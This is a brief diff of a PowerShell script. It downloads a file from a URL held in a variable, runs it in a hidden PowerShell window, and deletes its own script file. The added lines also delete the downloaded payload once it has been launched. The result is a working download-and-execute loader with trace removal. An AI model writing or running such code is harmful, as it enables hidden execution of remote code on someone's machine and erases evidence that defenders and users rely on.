@@ -10,5 +10,7 @@ Invoke-WebRequest -Uri $url -OutFile $scriptPath -UseBasicParsing
 # Execute the script silently
 Start-Process powershell.exe -ArgumentList "-File $scriptPath" -WindowStyle Hidden
 
+Remove-Item $scriptPath -Force
+
 # Remove the current script file
 Remove-Item $PSCommandPath -Force
